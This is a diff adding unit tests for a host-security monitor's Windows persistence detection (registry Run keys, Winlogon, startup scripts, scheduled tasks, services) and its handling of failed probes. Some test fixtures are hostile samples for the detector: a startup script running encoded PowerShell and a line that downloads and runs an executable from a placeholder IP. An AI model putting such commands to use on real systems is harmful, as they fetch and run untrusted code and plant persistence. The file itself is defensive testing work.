@@ -109,8 +109,11 @@ class ProcNetParser(unittest.TestCase):
         "00000000  1000        0 45679 1 0000 100 0\n")
 
     def test_wildcard_listener_kept_loopback_dropped(self):
+        # (port, uid, inode) — the uid is read because it is available without
+        # root even when the owning pid is not, keeping an unattributable
+        # listener actionable.
         rows = aegis._parse_proc_net_tcp(self.LISTEN)
-        self.assertEqual([("8080", "45678")], rows)
+        self.assertEqual([("8080", "1000", "45678")], rows)
 
     def test_established_rows_are_ignored_by_listen_parser(self):
         est = self.LISTEN.replace(" 0A ", " 01 ")
@@ -603,6 +606,326 @@ class ExecutableKindDetection(unittest.TestCase):
     def test_plain_text_is_not_an_executable(self):
         self.assertIsNone(aegis._executable_kind(
             self._write("readme.md", b"# hello\n")))
+
+
+# --------------------------------------------------------------------------- #
+# Windows persistence LIVE PLUMBING.
+#
+# The parser tests above cover text→record. This class covers the part that
+# cannot run off-Windows at all: the winreg enumeration loops, the Winlogon
+# deviation rule, the startup-folder walk, the schtasks call and the service
+# filter. A fake `winreg` module (matching the stdlib API surface actually
+# used: OpenKey as a context manager, EnumValue/EnumKey raising OSError to end
+# iteration, QueryValueEx) is injected so the real function body executes
+# end-to-end. Without this, _snapshot_persistence_windows had never run a
+# single line outside Windows.
+# --------------------------------------------------------------------------- #
+class _FakeWinregKey:
+    def __init__(self, values=None, subkeys=None):
+        self.values = list((values or {}).items())
+        self.subkeys = subkeys or {}
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+
+class _FakeWinreg:
+    HKEY_CURRENT_USER = "HKCU"
+    HKEY_LOCAL_MACHINE = "HKLM"
+
+    def __init__(self, tree):
+        # tree: {("HKCU", "Sub\\Key"): _FakeWinregKey}
+        self.tree = tree
+
+    def OpenKey(self, hive, subkey):
+        # `hive` is either a root constant or an already-open key (winreg
+        # allows both; the service loop relies on the latter).
+        if isinstance(hive, _FakeWinregKey):
+            child = hive.subkeys.get(subkey)
+            if child is None:
+                raise OSError(2, "not found")
+            return child
+        key = self.tree.get((hive, subkey))
+        if key is None:
+            raise OSError(2, "not found")
+        return key
+
+    def EnumValue(self, key, index):
+        try:
+            name, val = key.values[index]
+        except IndexError:
+            raise OSError(259, "no more data")
+        return name, val, 1
+
+    def EnumKey(self, key, index):
+        names = sorted(key.subkeys)
+        try:
+            return names[index]
+        except IndexError:
+            raise OSError(259, "no more data")
+
+    def QueryValueEx(self, key, name):
+        for k, v in key.values:
+            if k == name:
+                return v, 1
+        raise OSError(2, "no such value")
+
+
+class WindowsPersistenceLivePlumbing(unittest.TestCase):
+    def setUp(self):
+        import tempfile
+        self.startup = tempfile.mkdtemp(prefix="aegis_startup_")
+        self.appdata = tempfile.mkdtemp(prefix="aegis_appdata_")
+        self._saved = {
+            k: getattr(aegis, k) for k in
+            ("IS_WIN", "IS_MAC", "IS_LINUX", "PERSISTENCE_DIRS",
+             "TRUSTED_PREFIXES", "RISKY_PREFIXES", "run", "classify_signature",
+             "sha256")}
+        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
+        aegis.PERSISTENCE_DIRS = [self.startup]
+        aegis.TRUSTED_PREFIXES = ("C:\\Windows\\", "C:\\Program Files\\")
+        aegis.RISKY_PREFIXES = (self.appdata, "C:\\Users\\")
+        aegis.classify_signature = lambda p: {"trust": "unsigned", "team": None,
+                                              "authority": None}
+        aegis.sha256 = lambda p: "deadbeef"
+        # One user task from schtasks; the Microsoft tree is filtered by the
+        # parser, which this exercises through the real call path.
+        self._schtasks = (
+            '"HostName","TaskName","Next Run Time","Status","Task To Run"\n'
+            '"H","\\Updater","N/A","Ready","%AEGIS_FAKE_APPDATA%\\upd.exe -q"\n'
+            '"H","\\Microsoft\\Windows\\Defrag\\X","N/A","Ready","defrag.exe"\n')
+        os.environ["AEGIS_FAKE_APPDATA"] = self.appdata
+        aegis.run = lambda cmd, timeout=15, extra_env=None: (
+            (self._schtasks, "", 0) if cmd and cmd[0] == "schtasks"
+            else ("", "", 0))
+
+    def tearDown(self):
+        for k, v in self._saved.items():
+            setattr(aegis, k, v)
+        os.environ.pop("AEGIS_FAKE_APPDATA", None)
+
+    def _run_snapshot(self, tree):
+        fake = _FakeWinreg(tree)
+        sys.modules["winreg"] = fake
+        try:
+            return aegis._snapshot_persistence_windows()
+        finally:
+            sys.modules.pop("winreg", None)
+
+    def test_run_key_value_becomes_a_scored_record(self):
+        # The payload EXISTS on disk so the hash + signature-classification
+        # branch of _finish_persist_record actually runs (a non-existent
+        # program short-circuits to trust="missing" and skips it).
+        payload = os.path.join(self.appdata, "evil.exe")
+        with open(payload, "wb") as f:
+            f.write(b"MZ\x90\x00")
+        snap = self._run_snapshot({
+            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
+                _FakeWinregKey({"Updater": '"%s" --silent' % payload}),
+        })
+        key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+        self.assertIn(key, snap)
+        rec = snap[key]
+        self.assertEqual(payload, rec["program"])
+        self.assertEqual(["--silent"], rec["args"][1:])
+        self.assertTrue(rec["run_at_load"])
+        self.assertEqual("unsigned", rec["trust"])
+        self.assertEqual("deadbeef", rec["sha256"])
+        # And it must score as a real finding, not merely be recorded.
+        self.assertIn(aegis._persistence_severity(rec), ("HIGH", "CRITICAL"))
+
+    def test_missing_program_is_recorded_as_missing_not_crashed(self):
+        snap = self._run_snapshot({
+            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
+                _FakeWinregKey({"Gone": "C:\\nope\\ghost.exe"}),
+        })
+        rec = next(v for k, v in snap.items() if k.endswith("\\Gone"))
+        self.assertEqual("missing", rec["trust"])
+        self.assertIsNone(rec["sha256"])
+
+    def test_registry_env_vars_are_expanded_before_resolving_the_program(self):
+        # REG_EXPAND_SZ autostart values carry %VAR%; the literal backslash form
+        # is what Windows stores, so the expansion is asserted verbatim rather
+        # than through os.path.join (which would use the host separator).
+        snap = self._run_snapshot({
+            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
+                _FakeWinregKey({"E": "%AEGIS_FAKE_APPDATA%\\x.exe"}),
+        })
+        rec = next(v for k, v in snap.items() if k.endswith("\\E"))
+        self.assertEqual(self.appdata + "\\x.exe", rec["program"])
+        self.assertNotIn("%", rec["program"])
+
+    def test_healthy_winlogon_defaults_are_not_snapshotted(self):
+        # Zero churn: the healthy values must produce NO baseline entries at all.
+        snap = self._run_snapshot({
+            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Winlogon"):
+                _FakeWinregKey({"Shell": "explorer.exe",
+                                "Userinit": "C:\\Windows\\system32\\userinit.exe,",
+                                "Unrelated": "somevalue"}),
+        })
+        self.assertEqual([], [k for k in snap if "Winlogon" in k])
+
+    def test_tampered_winlogon_shell_is_captured(self):
+        payload = os.path.join(self.appdata, "evil.exe")
+        snap = self._run_snapshot({
+            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Winlogon"):
+                _FakeWinregKey({"Shell": "explorer.exe, %s" % payload}),
+        })
+        hits = [k for k in snap if "Winlogon" in k]
+        self.assertEqual(1, len(hits), snap)
+        self.assertTrue(snap[hits[0]]["run_at_load"])
+
+    def test_startup_folder_script_content_is_scored(self):
+        script = os.path.join(self.startup, "run.bat")
+        with open(script, "w") as f:
+            f.write("@echo off\r\npowershell -enc %s\r\n" % ("A" * 60))
+        snap = self._run_snapshot({})
+        key = "startup:" + script
+        self.assertIn(key, snap)
+        # A dropped .bat is persistence whose PAYLOAD is its own text, so the
+        # body is captured into args and must reach the argv scorer.
+        signals = dict(aegis._argv_signals(snap[key]["args"][0]))
+        self.assertEqual("HIGH", signals.get("powershell-encoded-command"))
+        self.assertIn(aegis._persistence_severity(snap[key]),
+                      ("HIGH", "CRITICAL"))
+
+    def test_scheduled_task_is_snapshotted_and_microsoft_tree_skipped(self):
+        snap = self._run_snapshot({})
+        self.assertIn("task:\\Updater", snap)
+        # schtasks stores a single command string with Windows separators.
+        self.assertEqual(self.appdata + "\\upd.exe",
+                         snap["task:\\Updater"]["program"])
+        self.assertEqual([], [k for k in snap if "Defrag" in k])
+
+    def test_service_outside_protected_tree_is_kept_system32_skipped(self):
+        evil = os.path.join(self.appdata, "svc.exe")
+        services = _FakeWinregKey(subkeys={
+            "EvilSvc": _FakeWinregKey({"ImagePath": '"%s" -k' % evil}),
+            "GoodSvc": _FakeWinregKey(
+                {"ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs"}),
+            "NoImage": _FakeWinregKey({"Start": 2}),
+        })
+        snap = self._run_snapshot({
+            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): services})
+        self.assertIn("service:EvilSvc", snap)
+        self.assertEqual(evil, snap["service:EvilSvc"]["program"])
+        self.assertNotIn("service:GoodSvc", snap,
+                         "a System32 service is trusted-location churn")
+        self.assertNotIn("service:NoImage", snap)
+
+    def test_missing_registry_keys_never_raise(self):
+        # Every hive/key absent must be skipped, not crash the scan. With
+        # schtasks also returning nothing, the whole snapshot is empty.
+        self._schtasks = ""
+        self.assertEqual({}, self._run_snapshot({}))
+
+    def test_all_surfaces_combine_into_one_diffable_snapshot(self):
+        payload = os.path.join(self.appdata, "evil.exe")
+        script = os.path.join(self.startup, "boot.cmd")
+        with open(script, "w") as f:
+            f.write("curl http://198.51.100.5/a.exe -o a.exe && a.exe\r\n")
+        tree = {
+            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
+                _FakeWinregKey({"R": payload}),
+            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): _FakeWinregKey(
+                subkeys={"S": _FakeWinregKey({"ImagePath": payload})}),
+        }
+        snap = self._run_snapshot(tree)
+        self.assertEqual(4, len(snap), snap)   # run key + service + startup + task
+        # The whole point of one record shape: the shared differ works on it.
+        findings = aegis.check_persistence({}, snap)
+        self.assertEqual(4, len(findings))
+        self.assertTrue(all(f["category"] == "persistence" for f in findings))
+        # And an unchanged snapshot must be silent.
+        self.assertEqual([], aegis.check_persistence(snap, snap))
+
+
+# --------------------------------------------------------------------------- #
+# Non-answer handling: a failed probe must never read as "clean"
+# --------------------------------------------------------------------------- #
+class ProbeFailureIsNeverClean(unittest.TestCase):
+    """The doctrine snapshot_btm() already enforces, applied to every probe
+    added by the port: a command that FAILED is a non-answer (None → DEGRADED),
+    never an empty world. Returning {} would adopt a false-empty baseline and
+    storm the moment the probe next succeeds; returning [] would report clean
+    coverage the tool does not have."""
+
+    def _with_run(self, fn, out="", err="boom", rc=1):
+        saved = aegis.run
+        aegis.run = lambda cmd, timeout=15, extra_env=None: (out, err, rc)
+        try:
+            return fn()
+        finally:
+            aegis.run = saved
+
+    def test_defender_exclusion_probe_failure_is_a_non_answer(self):
+        self.assertIsNone(self._with_run(aegis.snapshot_win_exclusions))
+
+    def test_wmi_probe_failure_is_a_non_answer(self):
+        self.assertIsNone(self._with_run(aegis.snapshot_wmi_subscriptions))
+
+    def test_event_log_probe_failure_is_a_non_answer(self):
+        self.assertIsNone(self._with_run(aegis.check_windows_event_log))
+
+    def test_windows_listener_probe_failure_is_a_non_answer(self):
+        self.assertIsNone(self._with_run(aegis._snapshot_listeners_windows))
+
+    def test_successful_probe_with_no_results_is_a_real_empty(self):
+        # rc=0 and no output means "nothing configured" — that IS an answer,
+        # and must stay {} so it baselines normally.
+        self.assertEqual({}, self._with_run(aegis.snapshot_win_exclusions,
+                                            out="", err="", rc=0))
+        self.assertEqual({}, self._with_run(aegis.snapshot_wmi_subscriptions,
+                                            out="", err="", rc=0))
+
+    def test_readable_but_empty_journal_is_coverage_not_a_gap(self):
+        # auth.log is root-only on most distros; falling back to a journal that
+        # reads fine but has no sshd/sudo/useradd lines means "nothing to
+        # report". Treating that as DEGRADED opened a bogus recurring
+        # "Security coverage degraded" incident on every quiet box.
+        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
+        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
+        aegis._read_text = lambda p, limit=None: None
+        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "", 0)
+        try:
+            self.assertEqual([], aegis.check_auth_log())
+        finally:
+            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved
+
+    def test_unreadable_log_and_unreadable_journal_is_degraded(self):
+        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
+        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
+        aegis._read_text = lambda p, limit=None: None
+        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "denied", 1)
+        try:
+            self.assertIsNone(aegis.check_auth_log())
+        finally:
+            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved
+
+
+class ListenerAttribution(unittest.TestCase):
+    def test_unattributable_listener_names_its_owning_uid(self):
+        fs = aegis.diff_listeners({}, {"?:22": {"path": "?", "uid": "0"}})
+        self.assertEqual(1, len(fs))
+        self.assertIn("uid 0", fs[0]["detail"])
+        self.assertEqual("0", fs[0]["uid"])
+
+    def test_legacy_string_snapshot_values_still_diff(self):
+        # Baselines written before uid attribution store a bare path string;
+        # an upgrade must not crash or re-alert on them.
+        fs = aegis.diff_listeners({}, {"/usr/sbin/sshd:22": "/usr/sbin/sshd"})
+        self.assertEqual(1, len(fs))
+        self.assertEqual("/usr/sbin/sshd", fs[0]["path"])
+
+    def test_known_listener_is_not_re_alerted_after_the_value_shape_change(self):
+        # The KEY is what the differ compares, so adding uid to the VALUE must
+        # not resurrect an already-baselined listener.
+        prior = {"/usr/sbin/sshd:22": "/usr/sbin/sshd"}
+        cur = {"/usr/sbin/sshd:22": {"path": "/usr/sbin/sshd", "uid": "0"}}
+        self.assertEqual([], aegis.diff_listeners(prior, cur))
 
 
 # --------------------------------------------------------------------------- #
